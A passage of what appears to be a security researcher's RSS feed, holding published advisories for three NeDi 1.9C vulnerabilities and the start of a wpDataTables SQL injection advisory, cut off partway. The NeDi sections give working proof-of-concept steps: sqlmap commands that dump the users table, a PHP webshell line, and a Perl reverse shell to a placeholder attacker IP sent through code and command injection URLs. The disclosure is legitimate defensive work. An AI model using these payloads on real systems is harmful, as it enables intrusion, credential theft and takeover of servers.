Injection&amp;rsquo;) - CWE-89&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; An authenticated user can perform a SQL injection attack to access all the data in the database and obtain access to the web application.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; Valid credentials for NeDi web interface. Also, some events have to be present on the Monitoring History graphs.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26751&#34;&gt;CVE-2021-26751&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-26751&#34;&gt;&lt;strong&gt;8.8&lt;/strong&gt; (High)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;First, it is necessary to perform a network discovery to generate events. Those events populate the Monitoring History graphs.&lt;br /&gt;An authenticated user that visits the Monitoring History page can perform a SQL injection attack in the &lt;strong&gt;det&lt;/strong&gt; parameter.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;https://hostname/Monitoring-History.php&#34;&gt;https://hostname/Monitoring-History.php&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameter:&lt;/strong&gt; det&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;The starting point is a standard installation of NeDi version 1.9C (the latest), via the deployment of the &lt;a href=&#34;https://www.nedi.ch/pub/NeDian20.ova&#34;&gt;NeDian20 OVA&lt;/a&gt; or with the installation script &lt;a href=&#34;https://www.nedi.ch/pub/nebuntu.sh&#34;&gt;nebuntu.sh&lt;/a&gt;, without further configuration. After the installation, it is necessary to perform a network discovery to generate events for the vulnerability PoC.&lt;/p&gt;&lt;p&gt;Login to NeDi web administrative interface with the &lt;strong&gt;admin&lt;/strong&gt; account.&lt;br /&gt;To execute a network discovery to generate events, go to &lt;strong&gt;System&lt;/strong&gt; -&amp;gt; &lt;strong&gt;NeDi&lt;/strong&gt;, or directly to the URL &lt;a href=&#34;https://hostname/System-NeDi.php&#34;&gt;https://hostname/System-NeDi.php&lt;/a&gt;.&lt;br /&gt;Select &lt;strong&gt;Discover&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Ping&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Source&lt;/strong&gt; -&amp;gt; &lt;strong&gt;&amp;lt;IP_ADDRESS&amp;gt;&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Execute&lt;/strong&gt; and wait 1 minute.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/7203c990163ed0b6b0dc3d24135eb4f1.png&#34; alt=&#34;Network discovery&#34; /&gt;&lt;/p&gt;&lt;p&gt;To view the results, go to &lt;strong&gt;Monitoring&lt;/strong&gt; -&amp;gt; &lt;strong&gt;History&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Show&lt;/strong&gt;, or directly to the URL &lt;a href=&#34;https://hostname/Monitoring-History.php&#34;&gt;https://hostname/Monitoring-History.php&lt;/a&gt;.&lt;br /&gt;Select a big time frame, like &lt;strong&gt;30 Hours&lt;/strong&gt;. The important is to have data in the graph.&lt;br /&gt;When it is seen the green event peak, intercept the request with a proxy like &lt;a href=&#34;https://portswigger.net/burp&#34;&gt;&lt;strong&gt;Burp Suite&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/9fd0c32a849940b9141eb847e0ded96b.png&#34; alt=&#34;Monitoring History&#34; /&gt;&lt;/p&gt;&lt;p&gt;The request on Burp Suite will be like the next screenshot.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/fc67a35a443fca84798d4ec2bf65fa9b.png&#34; alt=&#34;Burp Suite - SQLi&#34; /&gt;&lt;/p&gt;&lt;p&gt;Copy the intercepted request, and paste the content a text file named &lt;strong&gt;monitoring.txt&lt;/strong&gt;, similar to the following one:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;GET https://hostname/Monitoring-History.php?in%5B%5D=info&amp;amp;op%5B%5D=%7E&amp;amp;st%5B%5D=&amp;amp;det=class&amp;amp;gra=3600&amp;amp;fmt=ag&amp;amp;stt=01%2F27%2F2021+18%3A15&amp;amp;dur=1800&amp;amp;sho=Show HTTP/1.1Host: hostnameUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeReferer: https://hostname/Monitoring-History.php?in%5B%5D=info&amp;amp;op%5B%5D=%7E&amp;amp;st%5B%5D=&amp;amp;det=class&amp;amp;gra=3600&amp;amp;fmt=ag&amp;amp;stt=01%2F27%2F2021+18%3A15&amp;amp;dur=1800&amp;amp;sho=ShowCookie: PHPSESSID=hlkgaah276693mqb0ce09qk1hhUpgrade-Insecure-Requests: 1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, use the &lt;a href=&#34;http://sqlmap.org&#34;&gt;&lt;strong&gt;SQLMap&lt;/strong&gt;&lt;/a&gt; tool to exploit the vulnerability with the following command:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;sqlmap -r monitoring.txt --level=5 --risk=3 --random-agent --dbms=mysql --banner&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The banner of the database is gathered as PoC of the vulnerability:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/51462c09402afab2d2043b849910d2e9.png&#34; alt=&#34;SQLMap - Banner&#34; /&gt;&lt;/p&gt;&lt;p&gt;It is possible to dump all the NeDi database to extract the credentials. If a successful password cracking attack is accomplished, an attacker can use the credentials to login to the NeDi admin page.&lt;br /&gt;To extract the &lt;strong&gt;users&lt;/strong&gt; table, use the following command:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;sqlmap -r monitoring.txt --level=5 --risk=3 --random-agent --dbms=mysql -D nedi -T users --dump&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/ecb294d282eb9ee7179679a22e661a42.png&#34; alt=&#34;SQLMap - Database dump&#34; /&gt;&lt;/p&gt;&lt;p&gt;The vulnerability is tested on NeDi version 1.9C, as depicted by the following screenshot:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/ed71dd9f2087c7f98eb4770ed8f72ee7.png&#34; alt=&#34;Vulnerable version confirmation - NeDi 1.9C&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue an attacker is able to access all the data in the database and obtain access to the NeDi application, because all the data, including NeDi credentials, can be extracted and cracked.&lt;br /&gt;It is important to note that a valid NeDi administator account is also able to execute Remote Code Execution attack because of the following reported issues that allows Remote Code Execution. This scenario allows the entire compromise of the target operating system where NeDi is installed.&lt;/p&gt;&lt;h3 id=&#34;2-improper-control-of-generation-of-code-code-injection-cwe-94&#34;&gt;&lt;strong&gt;2 - Improper Control of Generation of Code (Code Injection) - CWE-94&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; An authenticated user is able to inject PHP code to obtain access to the operating system where NeDi is installed and to all application data.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; Valid credentials for NeDi web interface.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26753&#34;&gt;CVE-2021-26753&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-26753&#34;&gt;&lt;strong&gt;9.9&lt;/strong&gt; (Critical)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;An authenticated user that visits the System Files page can perform a Code Injection attack in the &lt;strong&gt;txt&lt;/strong&gt; parameter.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;https://hostname/System-Files.php&#34;&gt;https://hostname/System-Files.php&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameter:&lt;/strong&gt; txt&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;The starting point is a standard installation of NeDi version 1.9C (the latest), via the deployment of the &lt;a href=&#34;https://www.nedi.ch/pub/NeDian20.ova&#34;&gt;NeDian20 OVA&lt;/a&gt; or with the installation script &lt;a href=&#34;https://www.nedi.ch/pub/nebuntu.sh&#34;&gt;nebuntu.sh&lt;/a&gt;, without further configuration. After the installation, it is necessary to edit a PHP file on the web interface and bypass the execution filter.&lt;/p&gt;&lt;p&gt;Login to NeDi web administrative interface with the &lt;strong&gt;admin&lt;/strong&gt; account.&lt;br /&gt;To edit a PHP file, go to &lt;strong&gt;System&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Files&lt;/strong&gt;, or directly to the URL &lt;a href=&#34;https://hostname/System-Files.php&#34;&gt;https://hostname/System-Files.php&lt;/a&gt;.&lt;br /&gt;Select &lt;strong&gt;log/devtools&lt;/strong&gt;, that will be opened with the text editor.&lt;/p&gt;&lt;p&gt;Add the following line at the beginning of the file:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?php if(isset($_REQUEST[&#39;cmd&#39;])){ echo &amp;quot;&amp;lt;pre&amp;gt;&amp;quot;; $cmd = ($_REQUEST[&#39;cmd&#39;]); system($cmd); echo &amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;; die; }?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The reason to add it to on the top, is to bypass the direct execution prevention code:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Quit if called directlyif( !isset($_SESSION[&#39;group&#39;]) ) exit;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The code will prevent to execute the webshell, if the following page is requested directly:&lt;a href=&#34;https://hostname/log/devtools.php&#34;&gt;https://hostname/log/devtools.php&lt;/a&gt;&lt;/p&gt;&lt;p&gt;It il possible to leave the remaining code, because the rest of if will not be executed.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/95ab5a4240d1f11b191582c4947ad2f4.png&#34; alt=&#34;System Files - Code Injection - Payload&#34; /&gt;&lt;/p&gt;&lt;p&gt;After selecting &lt;strong&gt;Write&lt;/strong&gt;, the file will be saved to disk.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/67194cdf39f5db7e4f8e53c66848aad2.png&#34; alt=&#34;System Files - Code Injection - Save PHP page&#34; /&gt;&lt;/p&gt;&lt;p&gt;Open a handler on another machine:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;nc -nlvp 4444&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, choose a perl reverse shell, for example:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;perl -e &#39;use Socket;$i=&amp;quot;&amp;lt;attacker_ip&amp;gt;&amp;quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&#39;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To execute the reverse shell on the URL, do not forget to encode the space character to &lt;strong&gt;+&lt;/strong&gt; and &amp;amp; character to &lt;strong&gt;%26&lt;/strong&gt;, than execute the payload in a browser with a valid session, replacing the string &lt;code&gt;&amp;lt;attacker_ip&amp;gt;&lt;/code&gt; with the valid IP address:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;https://hostname/log/devtools.php?cmd=perl+-e+&#39;use+Socket;$i=&amp;quot;&amp;lt;attacker_ip&amp;gt;&amp;quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;quot;&amp;gt;%26S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;%26S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;%26S&amp;quot;);exec(&amp;quot;/bin/sh+-i&amp;quot;);};&#39;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The code is executed and a reverse shell is obtained.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/f2d4025ba79af3bde1e64e521580c0e4.png&#34; alt=&#34;Code Injection - Reverse shell&#34; /&gt;&lt;/p&gt;&lt;p&gt;It is important to note that a web application should not allow the server-side language file edit, in particular in scenarios where there must be segregation of duties between application administrators and operating system ones.&lt;/p&gt;&lt;p&gt;The HTTP request of the vulnerable parameter is the following, which does not sanitize the user input on &lt;strong&gt;txt&lt;/strong&gt; parameter:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/f230fb58d7146aa0a35d7a283dde9e72.png&#34; alt=&#34;Code Injection - vulnerable parameter&#34; /&gt;&lt;/p&gt;&lt;p&gt;The vulnerability is tested on NeDi version 1.9C, as depicted by the following screenshot:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/ed71dd9f2087c7f98eb4770ed8f72ee7.png&#34; alt=&#34;Vulnerable version confirmation - NeDi 1.9C&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;When software allows a user&amp;rsquo;s input to contain code syntax, it might be possible for an attacker to craft the code in such a way that it will alter the intended control flow of the software. Such an alteration could lead to arbitrary code execution.&lt;/p&gt;&lt;p&gt;On its own, an arbitrary code execution exploit will give the attacker the same privileges as the target process that is vulnerable. This includes access to all the data of the target application and the underlying operating system.&lt;/p&gt;&lt;h3 id=&#34;3-improper-neutralization-of-special-elements-used-in-an-os-command-os-command-injection-cwe-78&#34;&gt;&lt;strong&gt;3 - Improper Neutralization of Special Elements used in an OS Command (&amp;lsquo;OS Command Injection&amp;rsquo;) - CWE-78&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; An authenticated user is able to execute operating system commands to obtain access to the operating system where NeDi is installed and to all application data.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; Valid credentials for NeDi web interface.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26752&#34;&gt;CVE-2021-26752&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-26752&#34;&gt;&lt;strong&gt;8.8&lt;/strong&gt; (High)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;This security issue is found through source code analysis. By using special values in the &lt;strong&gt;Nodes-Traffic.php&lt;/strong&gt; endpoint, it is found that the URL parameters &lt;strong&gt;md&lt;/strong&gt; and &lt;strong&gt;ag&lt;/strong&gt; are not sanitized.&lt;br /&gt;An authenticated user that requests a URL with two forged parameters is able to execute operating system commands.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;https://hostname/Nodes-Traffic.php&#34;&gt;https://hostname/Nodes-Traffic.php&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameters:&lt;/strong&gt; md, ag&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;The starting point is a standard installation of NeDi version 1.9C (the latest), via the deployment of the &lt;a href=&#34;https://www.nedi.ch/pub/NeDian20.ova&#34;&gt;NeDian20 OVA&lt;/a&gt; or with the installation script &lt;a href=&#34;https://www.nedi.ch/pub/nebuntu.sh&#34;&gt;nebuntu.sh&lt;/a&gt;, without any configuration.&lt;/p&gt;&lt;p&gt;The PHP code on file &lt;strong&gt;/var/nedi/html/Nodes-Traffic.php&lt;/strong&gt; uses several &lt;code&gt;exec()&lt;/code&gt; functions.&lt;br /&gt;The one at line &lt;strong&gt;517&lt;/strong&gt; can be triggered if the variable &lt;code&gt;$am&lt;/code&gt; is true.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/8a4932fc089064cae7911f0504d8ac29.png&#34; alt=&#34;Command Injection - Target exec function&#34; /&gt;&lt;/p&gt;&lt;p&gt;On the beginning of the code, it is clear that is possible to control the &lt;code&gt;$am&lt;/code&gt; variable, on the purpose to enter the conditional branch of line 514.&lt;br /&gt;The &lt;code&gt;$am&lt;/code&gt; variable cannot be controlled directly, but the &lt;code&gt;$md&lt;/code&gt; one can be.&lt;br /&gt;According to the code, it is noted that:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;On line &lt;strong&gt;23&lt;/strong&gt;, the &lt;code&gt;$md&lt;/code&gt; is taken as URL parameter and is not being sanitized.&lt;/li&gt;&lt;li&gt;On line &lt;strong&gt;26&lt;/strong&gt;, if &lt;code&gt;$md = S&lt;/code&gt;, the target variable will be &lt;code&gt;$am = 1&lt;/code&gt;.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/4fd728859a97bb6f5f78717f69d46c62.png&#34; alt=&#34;Command Injection - $md and $am variable code&#34; /&gt;&lt;/p&gt;&lt;p&gt;To exploit this code branch, first login to NeDi web administrative interface with the &lt;strong&gt;admin&lt;/strong&gt; account.&lt;/p&gt;&lt;p&gt;As simple test, the following request can be triggered in the browser to write a simple file on &lt;code&gt;/tmp&lt;/code&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;https://hostname/Nodes-Traffic.php?md=S&amp;amp;ag=%3btouch+/tmp/pippo%3b&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/1278ebf47c921bf74f81719e373ec53e.png&#34; alt=&#34;Command Injection - Test command&#34; /&gt;&lt;/p&gt;&lt;p&gt;This is working because of the semicolon &lt;code&gt;;&lt;/code&gt; inserted before and after the command.&lt;br /&gt;Indeed, the final value for the variable &lt;code&gt;$nfcmd&lt;/code&gt; will be:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;nfdump -M /var/nfdump/ -r nfcapd.202101290100 -a -A srcip4/;touch /tmp/pippo; -O bytes -n 10 2&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That string is a valid Linux command, which gets executed by the &lt;code&gt;exec()&lt;/code&gt; function on line &lt;strong&gt;517&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;To take control of the operating system which runs the vulnerable application, first open a handler on another machine:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;nc -nlvp 4444&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To get the control of the server, use a perl reverse shell, replacing the string &lt;code&gt;&amp;lt;attacker_ip&amp;gt;&lt;/code&gt; with the valid IP address:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;https://hostname/Nodes-Traffic.php?md=S&amp;amp;ag=%3bperl+-e+&#39;use+Socket;$i=&amp;quot;&amp;lt;attacker_ip&amp;gt;&amp;quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;quot;&amp;gt;%26S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;%26S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;%26S&amp;quot;);exec(&amp;quot;/bin/sh+-i&amp;quot;);};&#39;%3b&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/b55f1e89c57e11d2f76a859ab2b67bbf.png&#34; alt=&#34;Command Injection - Reverse shell&#34; /&gt;&lt;/p&gt;&lt;p&gt;The vulnerability is tested on NeDi version 1.9C, as depicted by the following screenshot:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/ed71dd9f2087c7f98eb4770ed8f72ee7.png&#34; alt=&#34;Vulnerable version confirmation - NeDi 1.9C&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;When software allows a user&amp;rsquo;s input to contain code syntax, it might be possible for an attacker to craft the code in such a way that it will alter the intended control flow of the software. Such an alteration could lead to arbitrary code execution.&lt;/p&gt;&lt;p&gt;On its own, an arbitrary command execution exploit will give the attacker the same privileges as the target application that is vulnerable. This includes access to all the data of the target application and the underlying operating system.&lt;/p&gt;&lt;h2 id=&#34;timeline&#34;&gt;Timeline&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;01/02/2021&lt;/strong&gt;: First disclosure via e-mail to &lt;a href=&#34;info@nedi.ch&#34;&gt;info@nedi.ch&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;02/02/2021&lt;/strong&gt;: Acknowledge e-mail from the product owner!&lt;/li&gt;&lt;li&gt;&lt;strong&gt;04/02/2021&lt;/strong&gt;: Released the patch &lt;a href=&#34;https://www.nedi.ch/pub/nedi-1.9C1.ptc&#34;&gt;1.9Cp1&lt;/a&gt;, which has the fix for the vulnerabilities. Very impressive speed, the developer is very professional.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;09/02/2021&lt;/strong&gt;: Updated forum with advisory and credits: &lt;a href=&#34;https://forum.nedi.ch/index.php?topic=2322&#34;&gt;https://forum.nedi.ch/index.php?topic=2322&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;12/02/2021&lt;/strong&gt;: Published CVEs on MITRE.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;13/02/2021&lt;/strong&gt;: NVD scored &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-26751&#34;&gt;CVE-2021-26751&lt;/a&gt; and &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-26752&#34;&gt;CVE-2021-26752&lt;/a&gt; as &lt;strong&gt;8.8&lt;/strong&gt; (High), &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-26753&#34;&gt;CVE-2021-26753&lt;/a&gt; as &lt;strong&gt;9.9&lt;/strong&gt; (Critical).&lt;/li&gt;&lt;/ul&gt;</description>
     </item>
   
     <item>
       <title>WordPress Plugin wpDataTables - SQL Injection</title>
       <link>https://n4nj0.github.io/advisories/wordpress-plugin-wpdatatables-i/</link>
       <pubDate>Thu, 04 Feb 2021 10:15:00 +0100</pubDate>
       
       <guid>https://n4nj0.github.io/advisories/wordpress-plugin-wpdatatables-i/</guid>
       <description>&lt;h2 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h2&gt;&lt;p&gt;Me and my colleague Massimiliano Ferraresi have found an unauthenticated SQL Injection on wpDataTables version &amp;lt;= 3.4 on the table search parameter &lt;strong&gt;order&lt;/strong&gt;.&lt;/p&gt;&lt;h2 id=&#34;plugin-information&#34;&gt;Plugin Information&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Organization Name:&lt;/strong&gt; TMS&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Web Page:&lt;/strong&gt; &lt;a href=&#34;https://tms-outsource.com&#34;&gt;https://tms-outsource.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Vulnerability Disclosure Info or Technical Support Web Page:&lt;/strong&gt; &lt;a href=&#34;https://tmsplugins.ticksy.com/submit/#100004195&#34;&gt;https://tmsplugins.ticksy.com/submit/#100004195&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Plugin name:&lt;/strong&gt; wpDataTables&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Plugin version:&lt;/strong&gt; &amp;lt;= 3.4&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Plugin Web Page:&lt;/strong&gt; &lt;a href=&#34;https://wpdatatables.com&#34;&gt;https://wpdatatables.com&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;wpDataTables is a best-selling WordPress table plugin which makes very easy to work with tables, charts and data management. It is currently used by 40,000+ companies and individuals in financial, scientific, statistical, commercial and other sectors.&lt;/p&gt;&lt;p&gt;During a quick security auditing of the product, we have found that in the default configuration, a simple table can be published in a page that does not require authentication. The table can be searched, and is vulnerable to SQL Injection on the &lt;strong&gt;order&lt;/strong&gt; parameter.&lt;/p&gt;&lt;p&gt;The fix was developed with the release 3.4.1, the day after our vulnerability disclosure. That&amp;rsquo;s a very professional way to handle a high impact security vulnerability! We are so glad to collaborate with them.&lt;/p&gt;&lt;h2 id=&#34;vulnerability-details&#34;&gt;Vulnerability Details&lt;/h2&gt;&lt;h3 id=&#34;improper-neutralization-of-special-elements-used-in-an-sql-command-sql-injection-cwe-89&#34;&gt;&lt;strong&gt;Improper Neutralization of Special Elements used in an SQL Command (&amp;lsquo;SQL Injection&amp;rsquo;) - CWE-89&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; An unauthenticated user can perform a SQL injection attack to access all the data in the database and obtain access to the WordPress application.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; A simple table with default settings needs to be created and published in a page on WordPress.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26754&#34;&gt;CVE-2021-26754&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-26754&#34;&gt;&lt;strong&gt;9.8&lt;/strong&gt; (Critical)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;First, it is necessary to create a simple table with two columns and two rows. Then, the page can be published with default settings.&lt;br /&gt;An unauthenticated user that visits the page where the table is published can perform a SQL injection attack in the table search parameter &lt;strong&gt;order[0][dir]&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;http://hostname/wp-admin/admin-ajax.php?action=get_wdtable&amp;amp;table_id=1&#34;&gt;http://hostname/wp-admin/admin-ajax.php?action=get_wdtable&amp;amp;table_id=1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameter:&lt;/strong&gt; order[0][dir]&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;The starting point is a standard installation of WordPress version 5.6 (the latest), with a fresh install of the wpDataTables plugin, without further configuration. After the plugin installation, it is necessary to create a simple table used for the vulnerability PoC.&lt;/p&gt;&lt;p&gt;To create the table, login to WordPress as &lt;strong&gt;admin&lt;/strong&gt;.&lt;br /&gt;Under &lt;strong&gt;wpDataTables&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Create a Table&lt;/strong&gt;, select &lt;strong&gt;Create a data table manually&lt;/strong&gt; and then &lt;strong&gt;Next&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/18057ef8f7a7d086bfbe9ee37ac9e46a.png&#34; alt=&#34;Creation of the table (1)&#34; /&gt;&lt;/p&gt;&lt;p&gt;The table can have simple data, like the following:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Table name:&lt;/strong&gt; products&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Number of columns:&lt;/strong&gt; 2&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Column 1:&lt;/strong&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Name:&lt;/strong&gt; name&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Type:&lt;/strong&gt; One line string&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Column 2:&lt;/strong&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Name:&lt;/strong&gt; 